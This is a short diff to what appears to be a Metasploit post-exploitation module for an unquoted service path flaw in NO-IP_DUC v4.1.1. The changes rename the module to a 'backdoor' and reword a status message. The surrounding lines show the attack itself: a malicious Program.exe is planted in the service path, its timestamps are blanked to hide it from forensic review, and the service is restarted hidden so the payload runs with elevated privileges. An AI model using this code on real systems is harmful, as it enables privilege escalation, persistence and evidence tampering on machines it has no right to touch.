@@ -106,7 +106,7 @@ class MetasploitModule < Msf::Post
 # -----------------------------------------
         def initialize(info={})
                 super(update_info(info,
-                        'Name'          => 'NO-IP_DUC v4.1.1 - Unquoted Service Path Privilege Escalation',
+                        'Name'          => 'NO-IP_DUC v4.1.1 - Unquoted Service Path backdoor',
                         'Description'   => %q{
                                         This post-exploitation module requires a meterpreter session to be able to upload/inject our Program.exe into NoIPDUCService4 service. NO-IP_DUC v4.1.1 installs a service with an unquoted service path. This enables a local privilege escalation vulnerability. To exploit this vulnerability, a local attacker can insert an executable file in the path of the service. Rebooting the system or restarting the service will run the malicious executable with elevated privileges. "Warning: payload to be uploaded should be a service-binary executable named Program.exe"
                         },
@@ -225,7 +225,7 @@ def ls_stage1
       end
 
     # Change payload timestamp (date:time)
-    print_good(" timestamp => Blank backdoor agent timestamp...")
+    print_good(" Blanking backdoor agent timestamp...")
     client.priv.fs.blank_file_mace(bin_path)
     sleep(1.5)
     r = session.sys.process.execute("cmd.exe /c sc start NoIPDUCService4", nil, {'Hidden' => true, 'Channelized' => true})
